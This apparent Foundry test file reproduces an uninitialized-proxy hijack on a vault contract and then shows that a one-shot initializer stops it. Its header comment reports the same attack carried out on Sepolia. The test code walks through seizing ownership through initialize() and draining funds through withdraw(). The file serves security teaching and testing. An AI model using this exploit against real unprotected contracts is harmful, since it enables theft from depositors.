// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ERC1967Proxy} from "../src/ERC1967Proxy.sol";
import {Vault} from "../src/Vault.sol";
import {VaultFixed} from "../src/VaultFixed.sol";

// -----------------------------------------------------------------------------
// Proven on Sepolia (public Etherscan) — the on-chain capstone was driven with
// `cast` as TWO real transactions against an UNINITIALIZED proxy (owner slot == 0):
//   proxy    0x1c1ecce7a68dcb53afe299dc4e6ef7dceae5db85   (ERC1967 proxy in front of Vault)
//   attacker 0x4FB4299076A0bE795457427B70920297E742E6FC
//   1. initialize(attacker) — seize the empty owner slot, no permission needed:
//      https://sepolia.etherscan.io/tx/0x2460ac31397f234f6571b06e80f55340e084a58cda7cc794cb2b7649874c9949
//   2. withdraw() — "owner-only" now obeys the attacker; drains the vault (0.02 ETH):
//      https://sepolia.etherscan.io/tx/0xe003fe7de28aeaf4e92d2db3472b5c05f38de110f045fd496add4111848ad78e
// -----------------------------------------------------------------------------

/// @notice Reproduces the "Uninitialized Proxy Hijack" and proves the fix blocks it.
contract UninitProxyTest is Test {
    address internal deployer = makeAddr("deployer");
    address internal user     = makeAddr("user");     // honest depositor
    address internal attacker = makeAddr("attacker");

    uint256 internal constant FUNDS = 100 ether;

    // -----------------------------------------------------------------------
    // EXPLOIT: an unprotected, un-called initializer lets anyone seize the proxy
    // -----------------------------------------------------------------------
    function test_hijack() public {
        // 1) Deploy VULNERABLE logic + a proxy in front of it.
        //    initialize() is intentionally NOT called at deploy -> owner == 0.
        vm.startPrank(deployer);
        Vault logic = new Vault();
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic));
        vm.stopPrank();

        Vault vault = Vault(payable(address(proxy)));

        // The live proxy is "uninitialized": nobody owns it yet.
        assertEq(vault.owner(), address(0), "owner should be unset (uninitialized)");

        // 2) An honest user deposits real money into the vault.
        vm.deal(user, FUNDS);
        vm.prank(user);
        vault.deposit{value: FUNDS}();
        assertEq(address(vault).balance, FUNDS, "vault should hold the deposit");

        // 3) THE ATTACK: attacker calls the wide-open initializer and makes
        //    HIMSELF the owner. Costs nothing, needs no permission.
        assertEq(attacker.balance, 0, "attacker starts with nothing");
        vm.prank(attacker);
        vault.initialize(attacker);
        assertEq(vault.owner(), attacker, "attacker hijacked ownership");

        // 4) "owner-only" withdraw now obeys the ATTACKER and drains the vault.
        vm.prank(attacker);
        vault.withdraw();

        // 5) PROOF: attacker walked away with 100 ETH; the vault is empty.
        assertEq(attacker.balance, FUNDS, "attacker drained the vault");
        assertEq(address(vault).balance, 0, "vault emptied");

        console.log("HIJACK  attacker drained (wei):", attacker.balance);
        console.log("HIJACK  vault balance now (wei):", address(vault).balance);
    }

    // -----------------------------------------------------------------------
    // FIX: one-shot `initializer` guard + atomic init -> hijack is impossible
    // -----------------------------------------------------------------------
    function test_fixed() public {
        // 1) Deploy FIXED logic + proxy, and initialize ATOMICALLY as the
        //    deployer. In production this is done in the same deploy flow so
        //    there is no front-runnable window.
        vm.startPrank(deployer);
        VaultFixed logic = new VaultFixed();
        ERC1967Proxy proxy = new ERC1967Proxy(address(logic));
        VaultFixed vault = VaultFixed(payable(address(proxy)));
        vault.initialize(deployer); // <-- atomic, first-and-only init
        vm.stopPrank();

        assertEq(vault.owner(), deployer, "deployer owns it from the start");

        // honest user deposits.
        vm.deal(user, FUNDS);
        vm.prank(user);
        vault.deposit{value: FUNDS}();
        assertEq(address(vault).balance, FUNDS, "vault holds the deposit");

        // 2) THE ATTACK IS BLOCKED: a second initialize() reverts.
        vm.prank(attacker);
        vm.expectRevert(bytes("already initialized"));
        vault.initialize(attacker);

        // 3) Ownership and funds are unchanged; attacker got nothing.
        assertEq(vault.owner(), deployer, "owner unchanged");
        assertEq(address(vault).balance, FUNDS, "funds intact");
        assertEq(attacker.balance, 0, "attacker got nothing");

        // 4) And a direct withdraw by the attacker fails too (not owner).
        vm.prank(attacker);
        vm.expectRevert(bytes("not owner"));
        vault.withdraw();

        console.log("FIXED   init reverted; vault still holds (wei):", address(vault).balance);
        console.log("FIXED   owner still deployer? ", vault.owner() == deployer);
    }
}
